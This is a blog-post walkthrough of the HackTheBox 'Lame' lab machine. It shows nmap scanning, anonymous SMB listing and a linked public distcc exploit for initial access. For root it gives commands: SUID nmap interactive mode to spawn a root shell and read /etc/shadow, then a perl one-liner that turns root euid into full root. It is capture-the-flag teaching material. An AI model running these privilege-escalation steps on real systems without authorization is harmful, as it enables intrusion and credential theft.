---
layout: post
title: "Lame HackTheBox"
date: 2024-10-10
categories: ['HackTheBox', 'Walkthrough','Linux']
comments: true
author: Hemal Maniar
description: Hello
meta-description: Hello
keywords: 'lame,hackthebox,walkthrough,OSCP,tryharder'
img: 
alt:
output: 
  html_document:
    toc: true
    toc_float: true
    toc_collapsed: true
    toc_depth: 3
    number_sections: true
    theme: lumen
---

### Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.3        | **TCP**: 21,22,139,445,3632 

Ran all port scan
```bash
sudo nmap -sS -Pn -T5 -p- 10.10.10.3 -v -oA nmap2
```

Running a service scan
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h51m31s, deviation: 2h49m46s, median: -8m31s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-08-31T07:49:08-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

**139,445 - SMB Enumeration**

Allows anonymous listing of SMB shares.
```bash
smbclient -N -L \\10.10.10.3
```

### Initial Foothold
Found a public exploit for CVE-2004-2687 on [GitHub](https://github.com/angelpimentell/distcc_cve_2004-2687_exploit) that allows RCE by exploiting DistCC daemon.
here we can see the root directory for user `daemon` is in the /tmp folder which is accessible via the SMB share

### Privilege Escalation
Using linpeas, I found `nmap` has SUID bit enabled

Found a way to spawn an interactive nmap shell using nmap ([Reference](https://pentestlab.blog/2017/09/25/suid-executables/))

- start nmap interactive mode
```bash
nmap --interactive
```

```
nmap> !sh
```

here we can see that we can view contents of file `/etc/shadow` due to `euid=0(root)`

Found a way to become root using a post found on [stackexchange](https://unix.stackexchange.com/questions/645075/attempting-to-get-root-uid-from-root-euid) to become root from root euid
```bash
perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'
```

First, I identified whether perl was present in the system
Got root




